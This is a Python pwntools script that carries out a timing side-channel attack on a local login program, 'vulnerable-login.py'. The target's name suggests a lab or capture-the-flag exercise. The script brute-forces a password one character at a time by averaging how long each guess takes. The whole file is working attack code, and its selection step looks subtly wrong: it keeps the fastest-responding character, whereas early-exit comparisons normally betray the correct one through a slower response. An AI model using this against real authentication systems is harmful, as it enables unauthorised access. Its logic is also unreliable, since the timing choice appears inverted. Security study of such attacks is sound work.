import string
import time

from pwn import process

# values
PASSWORD_LENGTH = 8
CHARSET = string.ascii_letters + string.digits
TRIALS_PER_GUESS = 7

# Measure the time taken for a single password attempt
def time_attempt(candidate):
    total = 0.0

    for _ in range(TRIALS_PER_GUESS):
        p = process(["python3", "vulnerable-login.py"])
        p.recvuntil(b"Enter Password: ")
        start_time = time.perf_counter()
        p.send((candidate + "\n").encode())
        p.recvline()
        end_time = time.perf_counter()
        p.close()
        total += end_time - start_time

    # return average time over multiple trials
    return total / TRIALS_PER_GUESS

# Guess the password character by character
def guess_password(length):
    guessed = ""

    # iterate over each position in the password
    for pos in range(length):
        best_char = ""
        best_time = float("inf")
        pad_len = length - pos - 1

        for ch in CHARSET:
            # construct candidate password
            candidate = guessed + ch + ("A" * pad_len)
            duration = time_attempt(candidate)
            if duration < best_time:
                best_time = duration
                best_char = ch

        guessed += best_char
        print(f"Recovered so far: {guessed}")

    return guessed


def main():
    password = guess_password(PASSWORD_LENGTH)
    print(f"\nGuessed password: {password}")


if __name__ == "__main__":
    main()
